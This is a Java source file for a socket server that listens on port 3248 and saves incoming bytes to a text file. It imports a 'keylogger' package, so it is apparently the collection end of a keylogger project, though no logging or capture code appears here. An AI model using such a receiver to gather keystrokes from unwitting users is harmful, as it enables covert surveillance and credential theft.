package sender;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.ServerSocket;
import java.net.Socket;

import keylogger.keyboardlogger;

public class Server {
//	private final static String fileToSend = "testFile.txt";
	
	/**
	 * reverse testing
	 */
	private final static String fileOutput = "testFile.txt";
	static int threadChecker = 0;

	public synchronized static void main(String args[])
			throws FileNotFoundException, UnsupportedEncodingException, InterruptedException {

		byte[] aByte = new byte[1];
        int bytesRead;
		ServerSocket welcomeSocket = null;
		Socket connectionSocket = null;
		InputStream is = null;

		while (true) {

			try {
				welcomeSocket = new ServerSocket(3248);
				System.out.println("accepting");
				connectionSocket = welcomeSocket.accept();
				is = connectionSocket.getInputStream();
			} catch (IOException ex) {
				// Do exception handling
				System.out.println("not accepting");
			}
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			if (is != null) {
				
				            FileOutputStream fos = null;
				            BufferedOutputStream bos = null;
				            try {
				            	System.out.println("testing 1");
				                fos = new FileOutputStream( fileOutput );
				                bos = new BufferedOutputStream(fos);
				                bytesRead = is.read(aByte, 0, aByte.length);
				
				                do {
				                        baos.write(aByte);
				                        System.out.println("writing " + aByte[0]);
				                        bytesRead = is.read(aByte);
				                } while (bytesRead != -1);
				                
				                System.out.println("testing 2");
				                bos.write(baos.toByteArray());
				                bos.flush();
				                bos.close();
				                connectionSocket.close();
				                welcomeSocket.close();
				                is = null;
				            } catch (IOException ex) {
				                // Do exception handling
				            	ex.printStackTrace();
				            	System.out.println("error receiving files");
				            }
				        }
			
			

		}

	}
}
